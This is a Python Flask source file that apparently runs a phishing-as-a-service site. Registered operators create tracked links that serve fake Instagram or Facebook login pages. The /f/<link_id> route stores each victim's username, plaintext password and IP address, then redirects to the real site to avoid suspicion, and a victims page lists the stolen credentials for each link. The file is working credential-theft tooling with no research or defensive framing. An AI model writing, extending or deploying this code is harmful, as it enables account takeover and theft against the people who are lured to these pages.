import os
import uuid
import sqlite3
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'default-fallback-secret-key-2026')
app.permanent_session_lifetime = timedelta(days=30)

DB_NAME = 'phish_data.db'

# -----------------  -----------------
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        link_id TEXT UNIQUE,
        template TEXT,
        created_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        username TEXT,
        password TEXT,
        ip TEXT,
        submitted_at TIMESTAMP,
        FOREIGN KEY (link_id) REFERENCES links (link_id)
    )''')
    conn.commit()
    conn.close()

init_db()

# -----------------  -----------------
@app.route('/')
def home():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        try:
            c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists. <a href='/register'>Try again</a>"
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session.permanent = True
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id FROM users WHERE username=? AND password=?", (username, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            return "Invalid credentials. <a href='/login'>Try again</a>"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?", (session['user_id'],))
    links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]} for row in c.fetchall()]
    conn.close()
    host_url = request.host_url
    return render_template('dashboard.html', user=session['username'], links=links, host_url=host_url)

@app.route('/create_link', methods=['GET', 'POST'])
def create_link():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        template = request.form['template']
        link_id = str(uuid.uuid4())[:8]
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO links (user_id, link_id, template, created_at) VALUES (?, ?, ?, ?)",
                  (session['user_id'], link_id, template, datetime.now()))
        conn.commit()
        conn.close()
        return redirect(url_for('dashboard'))
    return render_template('create_link.html')

@app.route('/f/<link_id>', methods=['GET', 'POST'])
def phish_page(link_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT template FROM links WHERE link_id=?", (link_id,))
    result = c.fetchone()
    if not result:
        conn.close()
        return "Invalid link", 404
    template_name = result[0]
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        c.execute("INSERT INTO victims (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                  (link_id, username, password, ip, datetime.now()))
        conn.commit()
        conn.close()
        real_url = 'https://www.instagram.com' if template_name == 'instagram' else 'https://www.facebook.com'
        return f"<div style='background:#0a0f1e; color:cyan; text-align:center; padding:50px;'>Redirecting...<script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script></div>"
    conn.close()
    if template_name == 'instagram':
        return render_template('instagram.html')
    else:
        return render_template('facebook.html')

@app.route('/victims/<link_id>')
def view_victims(link_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
    owner = c.fetchone()
    if not owner or owner[0] != session['user_id']:
        conn.close()
        return "Unauthorized", 403
    c.execute("SELECT username, password, ip, submitted_at FROM victims WHERE link_id=? ORDER BY submitted_at DESC", (link_id,))
    victims = [{'username': row[0], 'password': row[1], 'ip': row[2], 'submitted_at': row[3]} for row in c.fetchall()]
    conn.close()
    return render_template('victims.html', link_id=link_id, victims=victims)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)